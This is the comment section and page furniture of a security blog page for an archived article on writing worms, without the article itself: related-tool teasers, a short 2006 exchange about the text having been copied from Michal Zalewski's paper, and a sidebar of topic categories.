                <a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/02/GitLab-Watchman-Audit-Gitlab-For-Sensitive-Data-Credentials-150x75.png" alt="GitLab Watchman - Audit Gitlab For Sensitive Data &amp; Credentials"  width="150"  height="75" title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" class="woo-image alignleft" /></a>
                <a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/">GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials</a><br />
		GitLab Watchman is an app that uses the GitLab API to audit GitLab for sensitive data and credentials exposed internally, this includes code, commits, wikis etc                <div class="post-meta"><strong>February 3, 2021 - 87 Shares</strong></div>
                <div class="fix"></div>

        
        
                <a title="GKE Auditor &#8211; Detect Google Kubernetes Engine Misconfigurations" href="https://www.darknet.org.uk/2021/01/gke-auditor-detect-google-kubernetes-engine-misconfigurations/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/01/GKE-Auditor-Detect-Google-Kubernetes-Engine-Misconfigurations-150x75.png" alt="GKE Auditor - Detect Google Kubernetes Engine Misconfigurations"  width="150"  height="75" title="GKE Auditor &#8211; Detect Google Kubernetes Engine Misconfigurations" class="woo-image alignleft" /></a>
                <a title="GKE Auditor &#8211; Detect Google Kubernetes Engine Misconfigurations" href="https://www.darknet.org.uk/2021/01/gke-auditor-detect-google-kubernetes-engine-misconfigurations/">GKE Auditor &#8211; Detect Google Kubernetes Engine Misconfigurations</a><br />
		GKE Auditor is a Java-based tool to detect Google Kubernetes Engine misconfigurations, it aims to help security &amp; dev teams streamline the configuration process                <div class="post-meta"><strong>January 1, 2021 - 140 Shares</strong></div>
                <div class="fix"></div>

        
        
                <a title="zANTI &#8211; Android Wireless Hacking Tool Free Download" href="https://www.darknet.org.uk/2020/12/zanti-android-wireless-hacking-tool-free-download/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2020/12/zANTI-Android-Wireless-Hacking-Tool-Free-Download-150x75.jpg" alt="zANTI - Android Wireless Hacking Tool Free Download"  width="150"  height="75" title="zANTI &#8211; Android Wireless Hacking Tool Free Download" class="woo-image alignleft" /></a>
                <a title="zANTI &#8211; Android Wireless Hacking Tool Free Download" href="https://www.darknet.org.uk/2020/12/zanti-android-wireless-hacking-tool-free-download/">zANTI &#8211; Android Wireless Hacking Tool Free Download</a><br />
		zANTI is an Android Wireless Hacking Tool that functions as a mobile penetration testing toolkit that lets you assess the risk level of a network using mobile.                <div class="post-meta"><strong>December 7, 2020 - 205 Shares</strong></div>
                <div class="fix"></div>

        
        
                <a title="HELK &#8211; Open Source Threat Hunting Platform" href="https://www.darknet.org.uk/2020/11/helk-open-source-threat-hunting-platform/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2020/11/HELK-Open-Source-Threat-Hunting-Platform-150x75.png" alt="HELK - Open Source Threat Hunting Platform"  width="150"  height="75" title="HELK &#8211; Open Source Threat Hunting Platform" class="woo-image alignleft" /></a>
                <a title="HELK &#8211; Open Source Threat Hunting Platform" href="https://www.darknet.org.uk/2020/11/helk-open-source-threat-hunting-platform/">HELK &#8211; Open Source Threat Hunting Platform</a><br />
		The Hunting ELK or simply the HELK is an Open-Source Threat Hunting Platform with advanced analytics capabilities such as SQL declarative language, graphing etc                <div class="post-meta"><strong>November 6, 2020 - 197 Shares</strong></div>
                <div class="fix"></div>

        
        
                <a title="Trape &#8211; OSINT Analysis Tool For People Tracking" href="https://www.darknet.org.uk/2020/11/trape-osint-analysis-tool-for-people-tracking/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2020/11/trape-OSINT-Analysis-Tool-For-People-Tracking-150x75.png" alt="trape - OSINT Analysis Tool For People Tracking"  width="150"  height="75" title="Trape &#8211; OSINT Analysis Tool For People Tracking" class="woo-image alignleft" /></a>
                <a title="Trape &#8211; OSINT Analysis Tool For People Tracking" href="https://www.darknet.org.uk/2020/11/trape-osint-analysis-tool-for-people-tracking/">Trape &#8211; OSINT Analysis Tool For People Tracking</a><br />
		Trape is an OSINT analysis tool, which allows people to track and execute intelligent social engineering attacks in real-time.                <div class="post-meta"><strong>November 3, 2020 - 256 Shares</strong></div>
                <div class="fix"></div>

        	<p align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="8986902617"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</p><br />


	        <div class="post-entries">
	            <div class="nav-prev fl"><a href="https://www.darknet.org.uk/2006/11/hacking-tor-a-flaw-appears/" rel="prev"><i class="fa fa-angle-left"></i> Hacking Tor &#8211; A Flaw Appears?</a></div>
	            <div class="nav-next fr"><a href="https://www.darknet.org.uk/2006/12/internet-explorer-7-ie7-vulnerability-hits-the-streets/" rel="next">Internet Explorer 7 (IE7) Vulnerability Hits the Streets <i class="fa fa-angle-right"></i></a></div>
	            <div class="fix"></div>
	        </div>

		<div id="comments">		 	<h3 id="comments-title">4 Responses to <em>Writing Worms for Fun or Profit</em></h3>
		 	<ol class="commentlist">
				
		<li id="comment-35055" class="comment even thread-even depth-1">

	      	<div id="li-comment-35055" class="comment-container">

					                <div class="avatar"></div>
	            
		      	<div class="comment-head">

	                <span class="name">zmx</span>
	                <span class="date">December 2, 2006 at 12:24 pm</span>
	                <span class="perma"><a href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/#comment-35055" title="Direct link to this comment">#</a></span>
	                <span class="edit"></span>

				</div><!-- /.comment-head -->

		   		<div class="comment-entry">

				<p>why are you copying articles from other people and post them on your website? the right thing would be to provide a link to this paper not copy&amp;paste it here. some people may think that you wrote it. and where is the 0x0f paragraph?</p>

				
	                <div class="reply">
	                    	                </div><!-- /.reply -->

				</div><!-- /comment-entry -->

			</div><!-- /.comment-container -->

	</li><!-- #comment-## -->

		<li id="comment-35086" class="comment odd alt thread-odd thread-alt depth-1">

	      	<div id="li-comment-35086" class="comment-container">

					                <div class="avatar"></div>
	            
		      	<div class="comment-head">

	                <span class="name"><a href='https://www.darknet.org.uk' rel='external nofollow ugc' class='url'>Darknet</a></span>
	                <span class="date">December 2, 2006 at 7:39 pm</span>
	                <span class="perma"><a href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/#comment-35086" title="Direct link to this comment">#</a></span>
	                <span class="edit"></span>

				</div><!-- /.comment-head -->

		   		<div class="comment-entry">

				<p>The old articles I post are the original text file articles that were hosted on the old Darknet site since the 90&#8217;s.</p>
<p>Sometimes I see people still coming to this site searching for these old articles so I take the time to format them properly as everything has now moved to HTML and provide something that is still in demand.</p>
<p>I wouldn&#8217;t call it copying as no one here is claiming we wrote this as clearly stated.</p>

				
	                <div class="reply">
	                    	                </div><!-- /.reply -->

				</div><!-- /comment-entry -->

			</div><!-- /.comment-container -->

	</li><!-- #comment-## -->

		<li id="comment-35134" class="comment even thread-even depth-1">

	      	<div id="li-comment-35134" class="comment-container">

					                <div class="avatar"></div>
	            
		      	<div class="comment-head">

	                <span class="name">zmx</span>
	                <span class="date">December 3, 2006 at 8:34 am</span>
	                <span class="perma"><a href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/#comment-35134" title="Direct link to this comment">#</a></span>
	                <span class="edit"></span>

				</div><!-- /.comment-head -->

		   		<div class="comment-entry">

				<p>You are right, I&#8217;m sorry.<br />
I overreacted when I realized the 0x0f paragraph is missing.<br />
Check the<br />
<a href="http://lcamtuf.coredump.cx/worm.txt" title="original" rel="nofollow">original text</a>.</p>
<p>I&#8217;m a big fan of Michal Zalewski :)</p>

				
	                <div class="reply">
	                    	                </div><!-- /.reply -->

				</div><!-- /comment-entry -->

			</div><!-- /.comment-container -->

	</li><!-- #comment-## -->

		<li id="comment-35461" class="comment odd alt thread-odd thread-alt depth-1">

	      	<div id="li-comment-35461" class="comment-container">

					                <div class="avatar"></div>
	            
		      	<div class="comment-head">

	                <span class="name"><a href='https://www.darknet.org.uk' rel='external nofollow ugc' class='url'>Darknet</a></span>
	                <span class="date">December 5, 2006 at 4:37 pm</span>
	                <span class="perma"><a href="https://www.darknet.org.uk/2006/12/writing-worms-for-fun-or-profit/#comment-35461" title="Direct link to this comment">#</a></span>
	                <span class="edit"></span>

				</div><!-- /.comment-head -->

		   		<div class="comment-entry">

				<p>Don&#8217;t worry man, I&#8217;m a great fan of Michael&#8217;s too, I wouldn&#8217;t pretend I can write anything as good as this!</p>
<p>Ah didn&#8217;t see that last bit.</p>

				
	                <div class="reply">
	                    	                </div><!-- /.reply -->

				</div><!-- /comment-entry -->

			</div><!-- /.comment-container -->

	</li><!-- #comment-## -->
			</ol>
		 	</div>     
            </section><!-- /#main -->
                
            <aside id="sidebar">
<div id="search-3" class="widget widget_search"><h3>Search Darknet</h3><div class="search_main">
    <form method="get" class="searchform" action="https://www.darknet.org.uk/" >
        <input type="text" class="field s" name="s" value="Search..." onfocus="if (this.value == 'Search...') {this.value = '';}" onblur="if (this.value == '') {this.value = 'Search...';}" />
        <button type="submit" class="fa fa-search submit" name="submit" value="Search"></button>
    </form>
    <div class="fix"></div>
</div></div>
		<div id="woo_tabs-2" class="widget widget_woo_tabs"> 		<div id="tabs">

            <ul class="wooTabs">
                                <li class="popular"><a href="#tab-pop">Trending</a></li>                <li class="latest"><a href="#tab-latest">Latest Posts</a></li>                                            </ul>

            <div class="clear"></div>

            <div class="boxes box inside">

	            
                                <ul id="tab-pop" class="list">
                    	<li>
		<a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/03/APT-Hunter-Threat-Hunting-Tool-via-Windows-Event-Log-50x50.png" alt="APT-Hunter - Threat Hunting Tool via Windows Event Log"  width="50"  height="50" title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" class="woo-image alignleft" /></a>
		<a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/">APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log</a>
		<span class="meta">March 5, 2021 - 132 Shares</span>
		<div class="fix"></div>
	</li>
		<li>
		<a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/02/GitLab-Watchman-Audit-Gitlab-For-Sensitive-Data-Credentials-50x50.png" alt="GitLab Watchman - Audit Gitlab For Sensitive Data &amp; Credentials"  width="50"  height="50" title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" class="woo-image alignleft" /></a>
		<a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/">GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials</a>
		<span class="meta">February 3, 2021 - 87 Shares</span>
		<div class="fix"></div>
	</li>
	                </ul>
                                                <ul id="tab-latest" class="list">
                    
        <li>
                <a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/03/APT-Hunter-Threat-Hunting-Tool-via-Windows-Event-Log-50x50.png" alt="APT-Hunter - Threat Hunting Tool via Windows Event Log"  width="50"  height="50" title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" class="woo-image alignleft" /></a>
                <a title="APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log" href="https://www.darknet.org.uk/2021/03/apt-hunter-threat-hunting-tool-via-windows-event-log/">APT-Hunter &#8211; Threat Hunting Tool via Windows Event Log</a>
                <span class="meta">March 5, 2021 - 132 Shares</span>
                <div class="fix"></div>
        </li>

	
        <li>
                <a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/"><img src="https://cdn.darknet.org.uk/wp-content/uploads/2021/02/GitLab-Watchman-Audit-Gitlab-For-Sensitive-Data-Credentials-50x50.png" alt="GitLab Watchman - Audit Gitlab For Sensitive Data &amp; Credentials"  width="50"  height="50" title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" class="woo-image alignleft" /></a>
                <a title="GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials" href="https://www.darknet.org.uk/2021/02/gitlab-watchman-audit-gitlab-for-sensitive-data-credentials/">GitLab Watchman &#8211; Audit Gitlab For Sensitive Data &#038; Credentials</a>
                <span class="meta">February 3, 2021 - 87 Shares</span>
                <div class="fix"></div>
        </li>

	                </ul>
                                                
            </div><!-- /.boxes -->

        </div><!-- /wooTabs -->

        </div>         <div id="text-7" class="widget widget_text"><h3>Advertisements</h3>			<div class="textwidget"><p align="center">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- Darknet Responsive Sidebar -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-3033787195489589"
     data-ad-slot="8412120847"
     data-ad-format="auto"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</p>

<p align="center"><strong><a href="https://www.darknet.org.uk/contact-darknet/advertise/">Advertise on Darknet</a></strong></p>
</div>
		</div><div id="categories-2" class="widget widget_categories"><h3>Topics</h3>
			<ul>
					<li class="cat-item cat-item-8437"><a href="https://www.darknet.org.uk/category/advertorial/">Advertorial</a> (36)
</li>
	<li class="cat-item cat-item-18"><a href="https://www.darknet.org.uk/category/apple-hacking/" title="Apple Hacking and Security">Apple</a> (46)
</li>
	<li class="cat-item cat-item-12"><a href="https://www.darknet.org.uk/category/countermeasures/" title="Hacking Countermeasures">Countermeasures</a> (224)
</li>
	<li class="cat-item cat-item-26"><a href="https://www.darknet.org.uk/category/cryptography/">Cryptography</a> (82)
</li>
	<li class="cat-item cat-item-2"><a href="https://www.darknet.org.uk/category/database-hacking/" title="Database Hacking Articles">Database Hacking</a> (89)
</li>
	<li class="cat-item cat-item-27"><a href="https://www.darknet.org.uk/category/eventscons/">Events/Cons</a> (7)
</li>
	<li class="cat-item cat-item-10"><a href="https://www.darknet.org.uk/category/exploitsvulnerabilities/" title="Exploit Discussion">Exploits/Vulnerabilities</a> (430)
</li>
	<li class="cat-item cat-item-28"><a href="https://www.darknet.org.uk/category/forensics/">Forensics</a> (64)
</li>
	<li class="cat-item cat-item-34"><a href="https://www.darknet.org.uk/category/hacker-culture/" title="Articles about Hacker Culture and philes from the old skool text era for learning purposes.">Hacker Culture</a> (8)
</li>
	<li class="cat-item cat-item-1"><a href="https://www.darknet.org.uk/category/hacking-news/" title="Our archives contain the very best Hacking News articles including large scale hacks, exploit release, patches, 0-day and coverage of all major hackings.

">Hacking News</a> (235)
</li>
	<li class="cat-item cat-item-9"><a href="https://www.darknet.org.uk/category/hacking-tools/" title="Hacking Tools are pieces of software or programs created to help you with hacking or that users can utilise for hacking purposes.

Examples include Wep0ff â Wifi Cracking Tool, Brutus Password Cracker, wwwhack Web Hacking, THC-Hydra Network Login Hacking and pwdump/fgdump Windows Password Dumping Tools.



You can find the latest and best hacking tools below and more on Wikipedia.



Script Kiddie Hacking Tools

There are various tools that are classified as too easy to use, or too automated and these fall into the category of Script Kiddie Tools. These are people who just follow instructions from a manual or tutorial without really understanding the technology or process happening.

Examples of these tools would mainly be password cracking tools like Cain and Abel Password Cracker, Brutus Password Cracker and John the Ripper for Password Cracking.">Hacking Tools</a> (673)
</li>
	<li class="cat-item cat-item-22"><a href="https://www.darknet.org.uk/category/hardware-hacking/" title="Hardware Hacking Discussion">Hardware Hacking</a> (82)
</li>
	<li class="cat-item cat-item-23"><a href="https://www.darknet.org.uk/category/legal-issues/" title="To do with Legal/Law Issues of Hacking">Legal Issues</a> (179)
</li>
	<li class="cat-item cat-item-6"><a href="https://www.darknet.org.uk/category/linux-hacking/" title="Linux Hacking Articles">Linux Hacking</a> (72)
</li>
	<li class="cat-item cat-item-7"><a href="https://www.darknet.org.uk/category/virustrojanswormsrootkits/" title="Virus/Trojans/Worms/Rootkits Discussion">Malware</a> (238)
</li>
	<li class="cat-item cat-item-5"><a href="https://www.darknet.org.uk/category/networking-hacking/" title="Networking Hacking is an offensive branch of computer security related to networks hacking and the penetration of a target via the networking services or equipment.



Examples of network hacking tools include Kismet â Wireless Network Hacking, Sniffing &amp; Monitoring, THC-Hydra â The Fast and Flexible Network Login Hacking Tool, Infernal Twin Updated 2.6.11 â Automated Wireless Hacking Suite and Firesheep â Social Network Session Stealing/Hijacking Tool.



Network hacking would also include WLAN hacking, wifi hacking, wireless hacking, Cisco hacking and so on which would rely on various different types of network hacking software.

Types of Networking Hacking

In this day and age, pretty much all hacking takes place across some kind of network (be it a private network or LAN, the public Internet, a darknet, public radio networks or any other kind).

You can find the best resources and networking hacking tools below.">Networking Hacking Tools</a> (351)
</li>
	<li class="cat-item cat-item-31"><a href="https://www.darknet.org.uk/category/password-cracking/" title="Password cracking and the associated password cracker tools are often the area of information security and hacking that people get most excited about, oh wow I can hack email passwords? We get emails pretty much every day asking how to crack someone&#039;s Facebook password, or retrieve website credentials etc.




What is Password Cracking?

As commonly defined:

In cryptanalysis and computer security, password cracking is the process of recovering passwords from data that have been stored in or transmitted by a computer system. A common approach (brute-force attack) is to try guesses repeatedly for the password and check them against an available cryptographic hash of the password.

The purpose of password cracking might be to help a user recover a forgotten password (installing an entirely new password is less of a security risk, but it involves System Administration privileges), to gain unauthorized access to a system, or as a preventive measure by system administrators to check for easily crackable passwords. On a file-by-file basis, password cracking is utilized to gain access to digital evidence for which a judge has allowed access but the particular file&#039;s access is restricted.

From Wikipedia.

The Best Password Cracker Software

We have covered many of the most famous, some great examples are:

-  Brutus Password Cracker â Download brutus-aet2.zip AET2
- THC-Hydra â The Fast and Flexible Network Login Hacking Tool
- Download pwdump 1.4.2 and fgdump 1.3.4 â Windows Password Dumping
- Cain &amp; Abel â Download the Super Fast and Flexible Password Cracker with Network Sniffing
- JTR (Password Cracking) â John the Ripper 1.7 Released â FINALLY
- Ophcrack 2.2 Password Cracker Released
- hashcat â Multi-Threaded Password Hash Cracking Tool
- Medusa 2.0 Released â Parallel Network Login Brute Forcing Tool

And we have also published some related resources such as:

- Password Cracking Wordlists and Tools for Brute Forcing
- Password Cracking with Rainbowcrack and Rainbow Tables ">Password Cracking Tools</a> (105)
</li>
	<li class="cat-item cat-item-20"><a href="https://www.darknet.org.uk/category/phishing/" title="Posts relating to Phishing and online Scams">Phishing</a> (41)
</li>
	<li class="cat-item cat-item-17"><a href="https://www.darknet.org.uk/category/privacy/" title="Privacy related News and Articles">Privacy</a> (217)
</li>
	<li class="cat-item cat-item-29"><a href="https://www.darknet.org.uk/category/secure-coding/" title="Secure coding is very important in software development to ensure code security is high using techniques such as static analysis, code auditing and dynamic analysis to ensure safe coding practices are followed.



What Tools can be used for Secure Coding?

There are a variety of tools to ensure code safety, mostly based on source code auditing and static analysis.

The options available really depend on the language being used with some tools focusing on many languages such as Yasca â Multi-Language Static Analysis Toolset or specialist tools focusing on a single language like Brakeman â Static Analysis Rails Security Scanner.



">Secure Coding</a> (119)
</li>
	<li class="cat-item cat-item-11"><a href="https://www.darknet.org.uk/category/security-software/" title="Security Software Discussion">Security Software</a> (230)
</li>
	<li class="cat-item cat-item-13"><a href="https://www.darknet.org.uk/category/site-news/" title="Darknet Site News">Site News</a> (51)
<ul class='children'>
	<li class="cat-item cat-item-21"><a href="https://www.darknet.org.uk/category/site-news/authors/" title="Author Introductions and Information">Authors</a> (6)
</li>
</ul>
</li>
	<li class="cat-item cat-item-24"><a href="https://www.darknet.org.uk/category/social-engineering/" title="Social Engineering Discussion">Social Engineering</a> (37)
</li>
	<li class="cat-item cat-item-25"><a href="https://www.darknet.org.uk/category/spammers-scammers/">Spammers &#038; Scammers</a> (76)
</li>
	<li class="cat-item cat-item-3504"><a href="https://www.darknet.org.uk/category/stupid-emails/" title="Low value e-mails I recieve on a regular basis.">Stupid E-mails</a> (6)
</li>
	<li class="cat-item cat-item-16"><a href="https://www.darknet.org.uk/category/telecomms-hacking/" title="Telecomms Hacking Articles">Telecomms Hacking</a> (6)
</li>
	<li class="cat-item cat-item-8"><a href="https://www.darknet.org.uk/category/unix-hacking/" title="UNIX Hacking Articles">UNIX Hacking</a> (6)
</li>
	<li class="cat-item cat-item-30"><a href="https://www.darknet.org.uk/category/virology/" title="Articles about viruses, virus creation, polymorphism and so on.">Virology</a> (6)
</li>
	<li class="cat-item cat-item-15"><a href="https://www.darknet.org.uk/category/web-hacking/" title="Web hacking is always the latest headline find web hacking 101, tools, web site hacking, web application hacking and the latest news about website hacking here.



Some examples of web hacking tools are:
- wwwhack 1.9 â wwwhack19.zip Web Hacking Software Free Download
- Wfuzz Download â Web Application Password Cracker
- FLARE â Flash Decompiler to Extract ActionScript
- WebSurgery â Web Application Security Testing Suite

Some examples of web hacking protection are:

- Shadow Daemon â Web Application Firewall">Web Hacking</a> (384)
</li>
	<li class="cat-item cat-item-4"><a href="https://www.darknet.org.uk/category/windows-hacking/" title="Windows Hacking Articles">Windows Hacking</a> (169)
</li>
	<li class="cat-item cat-item-3"><a href="https://www.darknet.org.uk/category/wireless-hacking/" title="Wireless Hacking Tools are pieces of software or programs created to help you with wifi hacking or that users can utilise for Hacking Wireless Networks.

Examples include Gerix WiFi Cracker â Wireless 802.11 Hacking Tool With GUI, WepAttack â WLAN 802.11 WEP Key Hacking Tool, Infernal Twin - Automatic Wifi Hacking Tool and Reaver Download â Hack WPS Pin WiFi Networks.





You can find the latest and best wireless hacking tools below and more on Wikipedia.



Hacking Wireless Networks with Android Wireless Hacking Tools

There are various tools for mobile hacking wifi networks using android wifi hacking tools like Hijacker â Reaver For Android Wifi Hacker App and Intercepter-NG - Android App For Hacking.">Wireless Hacking</a> (45)
</li>
			</ul>

			</div></aside><!-- /#sidebar -->

		</div><!-- /#main-sidebar-container -->         

		
    </div><!-- /#content -->
	
	<footer id="footer" class="col-full">

		
		<div id="copyright" class="col-left">
			<p>&copy; 2021 Darknet. All Rights Reserved. </p>		</div>

		<div id="credit" class="col-right">
			<p><a href="https://www.darknet.org.uk/about/privacy-policy/" rel="nofollow">Privacy Policy</a></p>		</div>

	</footer>

	
	</div><!-- /#inner-wrapper -->

</div><!-- /#wrapper -->

<div class="fix"></div><!--/.fix-->

		<!-- Advertising Manager v3.5.3 (0.361 seconds.) -->

<!--
TPC! Memory Usage (http://webjawns.com)
Memory Usage: 54436600Memory Peak Usage: 54724408WP Memory Limit: 128MPHP Memory Limit: 128MCheckpoints: 9-->

<!-- Woo Tabs Widget -->
<script type="text/javascript">
jQuery(document).ready(function(){
	// UL = .wooTabs
	// Tab contents = .inside

	var tag_cloud_class = '#tagcloud';

	//Fix for tag clouds - unexpected height before .hide()
	var tag_cloud_height = jQuery( '#tagcloud').height();

	jQuery( '.inside ul li:last-child').css( 'border-bottom','0px' ); // remove last border-bottom from list in tab content
	jQuery( '.wooTabs').each(function(){
		jQuery(this).children( 'li').children( 'a:first').addClass( 'selected' ); // Add .selected class to first tab on load
	});
	jQuery( '.inside > *').hide();
	jQuery( '.inside > *:first-child').show();

	jQuery( '.wooTabs li a').click(function(evt){ // Init Click funtion on Tabs

		var clicked_tab_ref = jQuery(this).attr( 'href' ); // Strore Href value

		jQuery(this).parent().parent().children( 'li').children( 'a').removeClass( 'selected' ); //Remove selected from all tabs
		jQuery(this).addClass( 'selected' );
		jQuery(this).parent().parent().parent().children( '.inside').children( '*').hide();

		jQuery( '.inside ' + clicked_tab_ref).fadeIn(500);

		 evt.preventDefault();

	})
})
</script>
<script type='text/javascript' id='wp-postviews-cache-js-extra'>
/* <![CDATA[ */
var viewsCacheL10n = {"admin_ajax_url":"https:\/\/www.darknet.org.uk\/wp-admin\/admin-ajax.php","post_id":"406"};
/* ]]> */
</script>
<script src="https://www.darknet.org.uk/wp-content/cache/minify/39445.js"></script>

<script type='text/javascript' id='social_warfare_script-js-extra'>
/* <![CDATA[ */
var socialWarfare = {"addons":["pro"],"post_id":"406","variables":{"emphasizeIcons":"0","powered_by_toggle":false,"affiliate_link":"https:\/\/warfareplugins.com"},"floatBeforeContent":""};
/* ]]> */
</script>

<script src="https://www.darknet.org.uk/wp-content/cache/minify/3801c.js"></script>

<script type="text/javascript"> var swp_nonce = "0de83df0aa";var swpFloatBeforeContent = false; var swp_ajax_url = "https://www.darknet.org.uk/wp-admin/admin-ajax.php"; var swp_post_id = "406";var swpClickTracking = false; swpPinIt={"enabled":false};</script></body>
</html>
<!--
Performance optimized by W3 Total Cache. Learn more: https://www.boldgrid.com/w3-total-cache/

Page Caching using disk: enhanced 
Content Delivery Network via Amazon Web Services: CloudFront: cdn.darknet.org.uk
Minified using disk

Served from: www.darknet.org.uk @ 2021-03-22 11:29:49 by W3 Total Cache
-->